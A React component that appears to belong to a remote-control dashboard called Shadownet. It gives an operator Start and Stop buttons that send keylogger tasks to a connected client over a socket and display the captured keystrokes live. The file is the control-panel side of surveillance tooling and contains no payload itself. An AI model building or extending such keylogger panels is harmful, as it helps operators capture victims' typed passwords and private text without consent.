/** @format */

"use client";

import {
	AlertDialog,
	AlertDialogAction,
	AlertDialogCancel,
	AlertDialogContent,
	AlertDialogDescription,
	AlertDialogFooter,
	AlertDialogHeader,
	AlertDialogTitle,
	AlertDialogTrigger,
} from "@/components/ui/alert-dialog";
import { Button } from "@/components/ui/button";
import {
	startSocketTasksAction,
	stopSocketTasksAction,
} from "@/lib/slices/ShadownetSlices";
import React, { useEffect, useState } from "react";
import { useDispatch } from "react-redux";

const Keylogger = ({ id, socketState, socketStream, setSocketStream }) => {
	const dispatch = useDispatch();
	const [logs, setLogs] = useState("");
	const [btnState, setBtnState] = useState(false);

	const handleStartKeylogger = () => {
		if (socketState) {
			dispatch(startSocketTasksAction({ id: id, task: "start_logger" }));
			setBtnState(true);
		}
	};

	const handleStopKeylogger = () => {
		setSocketStream(null);
		dispatch(stopSocketTasksAction({ id: id, task: "stop_logger" }));
		setBtnState(false);
	};

	useEffect(() => {
		return () => {
			if (btnState) {
				setSocketStream(null);
				dispatch(stopSocketTasksAction({ id: id, task: "stop_logger" }));
				setBtnState(false);
			}
		};
	}, [btnState]);

	useEffect(() => {
		if (socketStream) {
			console.log(socketStream);
			setLogs((prev) => prev + socketStream);
		}
	}, [socketStream]);

	return (
		<div className="w-full flex flex-col gap-2 min-h-[60vh]">
			<div className="bg-muted dark:bg-[#141414] p-4 rounded-xl flex items-start justify-between w-full">
				<div className="flex flex-col gap-1">
					<h3 className="font-semibold">Start Keylogger</h3>
					<h6 className="text-sm text-muted-foreground">
						Click on start to access the live keystrokes
					</h6>
					<h6 className="text-sm text-muted-foreground">
						Note: Changing tabs will loose all the captured data and stop the
						keylogger
					</h6>
				</div>
				<AlertDialog>
					<AlertDialogTrigger asChild>
						{btnState ? (
							<Button variant="destructive" className="w-40">
								Stop
							</Button>
						) : (
							<Button className="w-40">Start</Button>
						)}
					</AlertDialogTrigger>
					<AlertDialogContent>
						<AlertDialogHeader>
							<AlertDialogTitle>Are you sure?</AlertDialogTitle>
							{btnState ? (
								<AlertDialogDescription>
									Are you sure you want to stop?
								</AlertDialogDescription>
							) : (
								<AlertDialogDescription>
									Are you sure you want to start?
								</AlertDialogDescription>
							)}
						</AlertDialogHeader>
						<AlertDialogFooter>
							<AlertDialogCancel>Cancel</AlertDialogCancel>
							<AlertDialogAction
								onClick={btnState ? handleStopKeylogger : handleStartKeylogger}
							>
								{btnState ? "Stop" : "Start"}
							</AlertDialogAction>
						</AlertDialogFooter>
					</AlertDialogContent>
				</AlertDialog>
			</div>
			<div className="w-full h-[60vh] bg-muted dark:bg-[#141414] rounded-xl flex items-center justify-center">
				<div className="h-[60vh] w-full flex items-start overflow-scroll p-4">
					<code className="text-sm">{logs}</code>
				</div>
			</div>
		</div>
	);
};

export default Keylogger;
